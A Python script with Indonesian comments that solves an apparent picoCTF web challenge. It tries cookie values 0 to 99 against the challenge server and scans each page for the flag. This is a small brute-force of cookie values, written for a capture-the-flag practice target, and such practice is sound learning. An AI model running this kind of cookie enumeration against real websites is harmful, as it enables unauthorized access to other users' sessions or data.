#!/home/samvivan/Documents/CyberSecurity/TesSeulanga/.venv/bin/python
"""
Program ini dibuat untuk mencari flag pada website http://mercury.picoctf.net:29649/
dengan mencoba berbagai nilai cookie 'name' dari 0 hingga 99.

Cara kerja program:
1. Mengimpor modul yang diperlukan: signal, sys, requests, dan BeautifulSoup.
2. Mendefinisikan URL target.
3. Mendefinisikan kode warna untuk output terminal.
4. Mendefinisikan fungsi check_flag untuk memeriksa apakah nilai yang ditemukan mengandung 'picoCTF'.
5. Mendefinisikan fungsi signal_handler untuk menangani sinyal SIGINT (Ctrl+C) dan mengakhiri program.
6. Melakukan loop dari 0 hingga 99.
7. Pada setiap iterasi, program akan:
    a. Membuat cookie dengan nama 'name' dan nilai iterasi saat ini.
    b. Mengirim permintaan GET ke URL target dengan cookie tersebut.
    c. Jika respons berhasil (status_code 200), program akan:
        i. Mengambil nilai dari kelas 'jumbotron' pada halaman HTML.
        ii. Memeriksa apakah nilai tersebut mengandung 'picoCTF' dengan memanggil fungsi check_flag.
        iii. Jika check_flag mengembalikan True, program akan keluar.
        iv. Jika tidak, program akan mencetak cookie dan nilai yang ditemukan.
    d. Jika terjadi error, program akan mencetak error tersebut.
8. Jika setelah 100 percobaan tidak ditemukan flag, program akan mencetak pesan bahwa flag tidak ditemukan.
"""

import signal
import sys
import requests
from bs4 import BeautifulSoup

RED = '\033[91m'
RESET = '\033[0m'
YELLOW = '\033[93m'
GREEN = '\033[92m'

print(r"""
  /$$$$$$                      /$$       /$$                    
 /$$__  $$                    | $$      |__/                    
| $$  \__/  /$$$$$$   /$$$$$$ | $$   /$$ /$$  /$$$$$$   /$$$$$$$
| $$       /$$__  $$ /$$__  $$| $$  /$$/| $$ /$$__  $$ /$$_____/
| $$      | $$  \ $$| $$  \ $$| $$$$$$/ | $$| $$$$$$$$|  $$$$$$ 
| $$    $$| $$  | $$| $$  | $$| $$_  $$ | $$| $$_____/ \____  $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$ /$$$$$$$/
 \______/  \______/  \______/ |__/  \__/|__/ \_______/|_______/
""")
print(f"{GREEN}Copyright (c) 2024 Samvivan. All Rights Reserved.{RESET}\n")

url = 'http://mercury.picoctf.net:29649/'

def check_flag(value):
    if 'picoCTF' in value:
        print(f'Cookie: {GREEN}{nilai}{RESET}, {GREEN}{value}{RESET}')
        return True

def signal_handler(sig, frame):
    print(f'\n{RED}Terminating program...{RESET}')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

for i in range(100):
    nilai = str(i)
    cookie = {'name': nilai}
    try:
        response = requests.get(url, cookies=cookie)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            value = soup.find(class_='jumbotron')
            hasil = value.text.strip()
            if check_flag(hasil):
                sys.exit(0)
            print(f"Cookie: {YELLOW}{nilai}{RESET}, Hasil: {YELLOW}{hasil}{RESET}")
        else:
            print(f'Ada error: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Ada error: {e}')

print('Tidak dapat menemukan flag setelah 100 percobaan.')
